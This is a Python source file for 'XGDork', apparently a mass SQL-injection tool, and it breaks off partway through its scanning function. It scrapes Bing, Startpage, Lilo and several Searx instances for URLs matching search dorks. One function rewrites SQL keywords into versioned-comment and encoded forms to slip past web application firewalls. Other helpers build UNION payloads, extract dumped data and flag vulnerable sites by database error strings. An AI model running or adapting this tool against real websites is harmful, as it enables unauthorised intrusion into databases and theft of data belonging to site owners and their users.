# -*- coding: iso-8859-1 -*-

###### XGDork original code by ViraX (E4rr0r4)
import sys
from random import randint
from termcolor import colored
import requests
###### This program is a 'total' free software: you can redistribute it and/or modify
## GNU General Public License v3.0 ##



def     clearlist (l_list):
    
        i = 0
        while i <= len(l_list)-1:
            l_list.pop(i)
            i += 1



def     rand_agent ():

        agent_file = open('agents.txt', 'r')
        size = int(len(agent_file.readlines())-1)
        rnd_n = randint(5, size)
        agent_file.close()
        agent_file = open('agents.txt', 'r')
        user_agent = str(agent_file.readlines()[rnd_n])
        agent_file.close()
        user_agent = user_agent.replace('\n', '')

        return user_agent



def     lilo_search_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "<a class=\"resulttitle\" href=\"http"
        p = 1

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):    
                    print colored("\n[<Serial "+str(p)+">]", 'cyan')

                url = "https://search.lilo.org/?q="+s_dork+"&page="+str(p)
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+29
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)

        
        return list(set(urls))



def     startpage_search_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "href=\"http"
        p = 1
        i_npage *= 10

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    if (p == 1):
                        print colored("\n[<Serial "+str(p)+">]", 'cyan')
                    else:
                        print colored("\n[<Serial "+str(p/10+1)+">]", 'cyan')

                url = "https://s10-eu4.startpage.com/do/search?cmd=process_search&language=english&prf=21334709fc6a498bfad2ed75d1597501&suggestOn=1&qid=&rcount=&rl=NONE&abp=1&t=night&query="+s_dork+"&cat=web&engine0=v1all&startat="+str(p)+"&nj=0"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+6
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (new.find("startpage") > -1 or new.find("startmail") > -1 or new.find("Startpage") > -1):
                        new = ""
                    for element in urls:
                        if (element == new):
                            new = ""
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    if (new != ""):
                        urls.append(new)
                    
                        if (gd_statu == 0):
                            print colored("[!] URL Found: "+new)
                        new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 10

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 10

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))

# ------ SearchxEngine list ------

def     searchx_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "<article class=\"result result-default category-general qwant\"><a href=\""
        p = 1
    
        if (s_dork.find("inurl:") > -1):
            s_dork.replace("inurl:", '')

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    print colored("\n[<Serial "+str(p)+">]", 'cyan')

                url = "https://northboot.xyz/searx/search?q="+s_dork+"&category_general=1&pageno="+str(p)+"&time_range=None&safesearch=1&theme=simple"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+71
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))



def     searchx2_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "\"><h3><a href=\""
        p = 1

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    print colored("\n[<Serial "+str(p)+">]", 'cyan')

                url = "https://searx.feneas.org/search?q="+s_dork+"&category_general=1&pageno="+str(p)+"&time_range=None&safesearch=1&theme=simple"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+15
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))



def     searchx3_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "\"><h3><a href=\"http"
        p = 1

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    print colored("\n[<Serial "+str(p)+">]", 'cyan')

                url = "https://searx.xkek.net/searx/search?q="+s_dork+"&category_general=1&pageno="+str(p)+"&time_range=None&safesearch=1&theme=simple"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+15
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))


def     searchx4_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "\"><h3><a href=\"http"
        p = 1

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    print colored("\n[<Serial "+str(p)+">]", 'cyan')

                url = "https://search.antonkling.se/searx/search?q="+s_dork+"&category_general=1&pageno="+str(p)+"&time_range=None&safesearch=1&theme=simple"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+15
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))


def     searchx5_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "\"><h3><a href=\"http"
        p = 1

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    print colored("\n[<Serial "+str(p)+">]", 'cyan')

                url = "https://searx.rasp.fr/search?q="+s_dork+"&category_general=1&pageno="+str(p)+"&time_range=None&safesearch=1&theme=simple"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+15
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))


def     searchx6_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "\"><h3><a href=\"http"
        p = 1

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    print colored("\n[<Serial "+str(p)+">]", 'cyan')

                url = "https://searx.theanonymouse.xyz/search?q="+s_dork+"&category_general=1&pageno="+str(p)+"&time_range=None&safesearch=1&theme=simple"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+15
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))

# ------ ------ -------



def     bing_search_engine (s_dork, i_npage, i_debug, gd_statu):

        i = 0
        new = ""
        urls = []
        trace_indice = "\"b_algo\"><h2><a href=\""
        p = 1
        i_npage *= 10

        while (p <= i_npage):

            i = 0

            try:

                if (gd_statu == 0):
                    if (p == 1):
                        print colored("\n[<Serial "+str(p)+">]", 'cyan')
                    else:
                        print colored("\n[<Serial "+(str(p/10+1))+">]", 'cyan')

                url = "https://www.bing.com/search?q="+s_dork+"&first="+str(p)+"&count=50"
                user_agent = rand_agent()
                #headers = {'User-Agent': user_agent}
                headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'session_id=014a6858fbe053381e9ccfaf3942ed2ba33a5855; autocomplete=; safesearch=0; language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}

                if (gd_statu == 0):
                    print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+str(user_agent))

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+22
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)

                    if (gd_statu == 0):
                        print colored("[!] URL Found: "+new)
                    new = ""

                if (len(urls) == 0 and gd_statu == 1):
                    #print ("???")
                    return str("GD_E")
                    #gendork
                elif (len(urls) == 1 and gd_statu == 1):
                    #print (new)
                    return str("GD_W")
                    #gendork

                p += 10

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                p += 10

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)


        return list(set(urls))





def     urlslist_filter (list_urls, list_filter):
    
        i = 0
        y = 0
        size_urls = len(list_urls)
        size_filter = len(list_filter)
        lock = 0
        
        while (i < size_urls):
            lock = 0
            y = 0 
            while(y < size_filter):
                if (list_urls[i].find(list_filter[y]) != -1):
                    list_urls.pop(i)
                    size_urls = len(list_urls)
                    if (i != 0):
                        i -= 1
                    lock = 1
                y += 1
            if (lock != 1):
                i += 1

        return list(list_urls)


def     focpa (list_urls, s_param):
        
        i = 0
        lock = 0
        size_list = len(list_urls)

        while (i < size_list):
            lock = 0
            if (list_urls[i].find(s_param) == -1):
                list_urls.pop(i)
                size_list = len(list_urls)
                lock = 1
                if (i != 0):
                    i -= 1
            if (lock != 1):
                i += 1

        return list(list_urls)



def     listofile (list_urls, s_outfile, s_dork, i_mode, i_co_on):

        i = 0
        size_list = len(list_urls)

        if (i_mode == 1):
            s_outfile += "-URLS_FOUND"
        if (i_mode == 2):
            s_outfile += "-URLS_VULNERABLE"
        if (i_co_on == 0):
            nfile = open(str(s_outfile).replace('\n', '').replace(' ', ''), 'w')
        else:
            nfile = open(str(s_outfile).replace('\n', '').replace(' ', ''), 'a')

        nfile.write("<> --- XGDork result ["+s_dork+"] "+str(size_list)+"--- <>\n")

        while (i < size_list):
            nfile.write(str(list_urls[i]).replace('[', '').replace(']', '').replace("'", '').replace(',', '')+'\n')
            i += 1
        
        nfile.close()



def     sbws (string, mode):

        if (mode == 1):
            string = string.replace(" ", "+")
            string = string.replace("UNION", "/*!50000UnIoN*/")
            string = string.replace("ORDER", "/*!50000OrDeR*/")
            string = string.replace("GROUP_CONCAT", "/*!50000GrOuP_CoNcAt*/")
            string = string.replace("CONCAT", "/*!50000CoNcAt*/")
            string = string.replace("CHAR", "/*!50000ChAr*/")
            string = string.replace("FROM", "/*!50000FrOm*/")
            string = string.replace("WHERE", "/*!50000WhErE*/")
            string = string.replace("RAND", "/*!50000RaNd*/")
            string = string.replace("FLOOR", "/*!50000FlOoR*/")
            string = string.replace("HEX", "/*!50000HeX*/")
            string = string.replace("UNHEX", "/*!50000UnHeX*/")
            string = string.replace("LIMIT", "/*!50000LiMiT*/")
            string = string.replace("ELT", "/*!50000ElT*/")
            string = string.replace("SLEEP", "/*!50000SlEeP*/")
            string = string.replace("SELECT", "/*!50000SeLeCt*/")
            string = string.replace("COUNT", "/*!50000CoUnT*/")
            string = string.replace("@@version", "/*!50000@@VeRsIoN*/")
            string = string.replace("version()", "/*!50000VeRsIoN()*/")
            string = string.replace("database()", "/*!50000DaTaBaSe()*/")
            string = string.replace("TABLE_NAME", "/*!50000TaBlE_NaMe*/")
            string = string.replace("COLUMN_NAME", "/*!50000CoLuMn_NaMe*/")
            string = string.replace("INFORMATION_SCHEMA.TABLES", "/*!50000InFoRmAtIoN_ScHeMa.TaBlEs*/")
            string = string.replace("INFORMATION_SCHEMA.COLUMNS", "/*!50000InFoRmAtIoN_ScHeMa.CoLuMnS*/")
            string = string.replace("INFORMATION_SCHEMA.PLUGINS", "/*!50000InFoRmAtIoN_ScHeMa.PlUgInS*/")
            string = string.replace("TABLE_SCHEMA", "/*!50000TaBlE_ScHeMa*/")
            string = string.replace("GROUP", "/*!50000GrOuP*/")
            string = string.replace("LIKE", "/*!50000LiKe*/")
            string = string.replace("BY", "/*!50000By*/")
            string = string.replace("CONCAT_WS", "/*!50000CoNcAt_Ws*/")
            string = string.replace("HAVING", "/*!50000HaViNg*/")
            string = string.replace("MIN", "/*!50000MiN*/")
            string = string.replace("CAST", "/*!50000CaSt*/")
            string = string.replace("AS", "/*!50000As*/")
            string = string.replace("CHAR", "/*!50000ChAr*/")
            string = string.replace("AND", "/*!50000AnD*/")
            string = string.replace("OR", "/*!50000Or*/")
            string = string.replace("UPDATEXML", "/*!50000UpDaTeXmL*/")

            string = string.replace("10000", "/*!5000010000*/")
            string = string.replace("-300", "/*!50000-300*/")
            string = string.replace("1984", "/*!500001984*/")

        if (mode == 2):
            string = string.replace(" ", "+")
            string = string.replace("UNION", "%2f**%2f%2f**%2fUnIoN%2f**%2f%2f**%2f")
            string = string.replace("ORDER", "%2f**%2f%2f**%2fOrDeR%2f**%2f%2f**%2f")
            string = string.replace("GROUP_CONCAT", "%2f**%2f%2f**%2fGrOuP_CoNcAt%2f**%2f%2f**%2f")
            string = string.replace("CONCAT", "%2f**%2f%2f**%2fCoNcAt%2f**%2f%2f**%2f")
            string = string.replace("CHAR", "%2f**%2f%2f**%2fChAr%2f**%2f%2f**%2f")
            string = string.replace("FROM", "%2f**%2f%2f**%2fFrOm%2f**%2f%2f**%2f")
            string = string.replace("WHERE", "%2f**%2f%2f**%2fWhErE%2f**%2f%2f**%2f")
            string = string.replace("RAND", "%2f**%2f%2f**%2fRaNd%2f**%2f%2f**%2f")
            string = string.replace("FLOOR", "%2f**%2f%2f**%2fFlOoR%2f**%2f%2f**%2f")
            string = string.replace("HEX", "%2f**%2f%2f**%2fHeX%2f**%2f%2f**%2f")
            string = string.replace("UNHEX", "%2f**%2f%2f**%2fUnHeX%2f**%2f%2f**%2f")
            string = string.replace("LIMIT", "%2f**%2f%2f**%2fLiMiT%2f**%2f%2f**%2f")
            string = string.replace("ELT", "%2f**%2f%2f**%2fElT%2f**%2f%2f**%2f")
            string = string.replace("SLEEP", "%2f**%2f%2f**%2fSlEeP%2f**%2f%2f**%2f")
            string = string.replace("SELECT", "%2f**%2f%2f**%2fSeLeCt%2f**%2f%2f**%2f")
            string = string.replace("COUNT", "%2f**%2f%2f**%2fCoUnT%2f**%2f%2f**%2f")
            string = string.replace("@@version", "%2f**%2f%2f**%2f@@VeRsIoN%2f**%2f%2f**%2f")
            string = string.replace("version()", "%2f**%2f%2f**%2fVeRsIoN()%2f**%2f%2f**%2f")
            string = string.replace("database()", "%2f**%2f%2f**%2fDaTaBaSe()%2f**%2f%2f**%2f")
            string = string.replace("TABLE_NAME", "%2f**%2f%2f**%2fTaBlE_NaMe%2f**%2f%2f**%2f")
            string = string.replace("COLUMN_NAME", "%2f**%2f%2f**%2fCoLuMn_NaMe%2f**%2f%2f**%2f")
            string = string.replace("INFORMATION_SCHEMA.TABLES", "%2f**%2f%2f**%2fInFoRmAtIoN_ScHeMa.TaBlEs%2f**%2f%2f**%2f")
            string = string.replace("INFORMATION_SCHEMA.COLUMNS", "%2f**%2f%2f**%2fInFoRmAtIoN_ScHeMa.CoLuMnS%2f**%2f%2f**%2f")
            string = string.replace("INFORMATION_SCHEMA.PLUGINS", "%2f**%2f%2f**%2fInFoRmAtIoN_ScHeMa.PlUgInS%2f**%2f%2f**%2f")
            string = string.replace("TABLE_SCHEMA", "%2f**%2f%2f**%2fTaBlE_ScHeMa%2f**%2f%2f**%2f")
            string = string.replace("GROUP", "%2f**%2f%2f**%2fGrOuP%2f**%2f%2f**%2f")
            string = string.replace("LIKE", "%2f**%2f%2f**%2fLiKe%2f**%2f%2f**%2f")
            string = string.replace("BY", "%2f**%2f%2f**%2fBy%2f**%2f%2f**%2f")
            string = string.replace("CONCAT_WS", "%2f**%2f%2f**%2fCoNcAt_Ws%2f**%2f%2f**%2f")
            string = string.replace("HAVING", "%2f**%2f%2f**%2fHaViNg%2f**%2f%2f**%2f")
            string = string.replace("MIN", "%2f**%2f%2f**%2fMiN%2f**%2f%2f**%2f")
            string = string.replace("CAST", "%2f**%2f%2f**%2fCaSt%2f**%2f%2f**%2f")
            string = string.replace("AS", "/%2f**%2f%2f**%2fAs%2f**%2f%2f**%2f")
            string = string.replace("CHAR", "%2f**%2f%2f**%2fChAr%2f**%2f%2f**%2f")
            string = string.replace("AND", "%2f**%2f%2f**%2fAnD%2f**%2f%2f**%2f")
            string = string.replace("OR", "%2f**%2f%2f**%2fOr%2f**%2f%2f**%2f")
            string = string.replace("UPDATEXML", "%2f**%2f%2f**%2fUpDaTeXmL%2f**%2f%2f**%2f")

            string = string.replace("10000", "%2f**%2f%2f**%2f10000%2f**%2f%2f**%2f")
            string = string.replace("-300", "%2f**%2f%2f**%2f-300%2f**%2f%2f**%2f")
            string = string.replace("1984", "%2f**%2f%2f**%2f1984%2f**%2f%2f**%2f")



        return string


def     nodata_stress (url, s_SQLi):

        i = 0
        f = 0
        size_url = 0
        nurl = ""

        f = url.find(s_SQLi, 0)+len(s_SQLi)
        while (i < f):
            nurl += url[i]
            i += 1
        
        return str(nurl)



def     turing_rangeUS (nc_c, id_c, s_data):
        ndata = ""
        i = 1
        while (i <= nc_c):
            if (i == nc_c):
                if (s_data != '' and i == id_c):
                    ndata += str(s_data)
                else:
                    ndata += str(i)
            else:
                if (s_data != '' and i== id_c):
                    ndata += str(s_data)+","
                else:
                    ndata += str(i)+","
            i += 1

        return ndata



def     block_cutter (string, int_start, int_end):

        newd = ""

        while (int_start <= int_end):
            newd += string[int_start]
            int_start += 1
        return newd



def     dump_data (data_req):

        s = 0
        e = 0

        new = block_cutter(data_req, (data_req.find("(^#^)")+5), (data_req.find("(V#V)")-1))

        if (new == ""):
            new = block_cutter(data_req, (data_req.find("FUNCTION ")+9), (data_req.find(".dabatase ")-1))

        return str(new)



def     GPP_Marvin (list_urls, s_SQLi, i_debug, i_timeout, mode_sqli):
        
        i = 0
        y = 0
        size_list = len(list_urls)
        nurls = []
        urlsvulnerable = []
        waf = 0
        
        SQLi_trace = ["where clause", "MySQL", "SQL", "sql", "SQL syntax", "Warning:", "mysqli_error()", "Invalid argument supplied for", "Notice: Undefined variable: ", "supplied argument is not a valid MySQL result resource in", "valid MySQL result", "Incorrect syntax near", "Incorrect parameter count in the call to native function ", "You have an error in your SQL syntax", "mysql_num_rows(): ", "mysql_num_row(): ", "mysql_fetch_array(): ", "mysql_query(): ", "mysql_result(): ", "Unknown(): ", "array_merge(): ", "require(): ", "MySQL Error: ", "SQL Error: ", "Unable to jump to row", "Session halted.", "Access denied for", "ODBC SQL Server Driver", "argument should be an array in", " expects parameter 1 to be resource, boolean given in ", "array_key_exists()", "parse_ini_file", "SAFE MODE Restriction in effect.", "include_once", "file_get_contents", "fetch_object()"]


        size_ST = len(SQLi_trace)
        terms = []
        level = 0

        while (i < size_list):
            terms[:] = []
            level = 0
            y = 0
            waf = 0
            dump = 0
            nodump = 0
            mode_bp = 1

            user_agent = rand_agent()
            headers = {'User-Agent': user_agent,
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                       'Accept-Encoding': 'gzip, deflate, utf-8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Connection': 'keep-alive',
                       'Cookie': 'language=en-US; locale=en; method=GET; disabled_plugins=;',
                       'Upgrade-Insecure-Requests': '1'}
            
            if (i_debug == 1):
                print ("user-agent -> "+str(user_agent))

            eurl = str(list_urls[i]).replace('[', '').replace(']', '').replace(',', '')
            
            print colored("\n[GPP Marvin ²] ["+str(i+1)+"/"+str(size_list)+"] work on "+eurl, 'cyan', attrs=['reverse', 'blink', 'bold'])
            print colored("[*] User-Agent: "+user_agent, 'green')            

            try:

            # ------ detect security ------

                if (mode_sqli == "Full" or mode_sqli == "full" or mode_sqli == 'f'):
